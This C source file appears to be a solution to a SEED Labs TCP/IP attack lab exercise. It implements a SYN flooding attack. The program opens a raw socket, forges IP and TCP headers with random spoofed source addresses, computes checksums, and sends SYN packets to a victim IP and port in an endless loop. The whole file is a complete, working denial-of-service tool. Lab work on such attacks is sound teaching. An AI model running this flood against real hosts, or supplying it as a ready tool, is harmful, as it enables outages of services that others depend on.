/*
 * Task 1.2: SYN Flooding Attack using C
 * SEED Labs - TCP/IP Attack Lab
 *
 * This program sends spoofed TCP SYN packets at high speed to flood
 * the victim's half-open connection queue.
 *
 * Compile: gcc -o synflood synflood.c
 * Usage:   ./synflood <victim_ip> <victim_port>
 *
 * Example: ./synflood 10.9.0.5 23
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>

#define PACKET_LEN 4096

/* Pseudo header for TCP checksum calculation */
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t  placeholder;
    u_int8_t  protocol;
    u_int16_t tcp_length;
};

unsigned short checksum(unsigned short *ptr, int nbytes)
{
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <victim_ip> <victim_port>\n", argv[0]);
        return 1;
    }

    char *victim_ip   = argv[1];
    int   victim_port = atoi(argv[2]);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    /* Tell the kernel we are providing the IP header ourselves */
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        return 1;
    }

    srand((unsigned)time(NULL));

    char buffer[PACKET_LEN];
    struct iphdr  *iph  = (struct iphdr  *)buffer;
    struct tcphdr *tcph = (struct tcphdr *)(buffer + sizeof(struct iphdr));

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family      = AF_INET;
    dest.sin_port        = htons(victim_port);
    dest.sin_addr.s_addr = inet_addr(victim_ip);

    while (1) {
        memset(buffer, 0, PACKET_LEN);

        /* Random source address */
        u_int32_t src_addr = rand();

        /* IP header */
        iph->ihl      = 5;
        iph->version  = 4;
        iph->tos      = 0;
        iph->tot_len  = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id       = htons(rand() & 0xFFFF);
        iph->frag_off = 0;
        iph->ttl      = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check    = 0;
        iph->saddr    = src_addr;
        iph->daddr    = inet_addr(victim_ip);
        iph->check    = checksum((unsigned short *)buffer,
                                 sizeof(struct iphdr));

        /* TCP header */
        tcph->source  = htons(rand() & 0xFFFF);
        tcph->dest    = htons(victim_port);
        tcph->seq     = rand();
        tcph->ack_seq = 0;
        tcph->doff    = 5;
        tcph->syn     = 1;
        tcph->window  = htons(8192);
        tcph->check   = 0;
        tcph->urg_ptr = 0;

        /* TCP checksum uses a pseudo header */
        struct pseudo_header psh;
        psh.source_address = src_addr;
        psh.dest_address   = inet_addr(victim_ip);
        psh.placeholder    = 0;
        psh.protocol       = IPPROTO_TCP;
        psh.tcp_length     = htons(sizeof(struct tcphdr));

        char pseudo_pkt[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
        memcpy(pseudo_pkt, &psh, sizeof(struct pseudo_header));
        memcpy(pseudo_pkt + sizeof(struct pseudo_header), tcph,
               sizeof(struct tcphdr));
        tcph->check = checksum((unsigned short *)pseudo_pkt,
                               sizeof(pseudo_pkt));

        sendto(sock, buffer, iph->tot_len, 0,
               (struct sockaddr *)&dest, sizeof(dest));
    }

    close(sock);
    return 0;
}
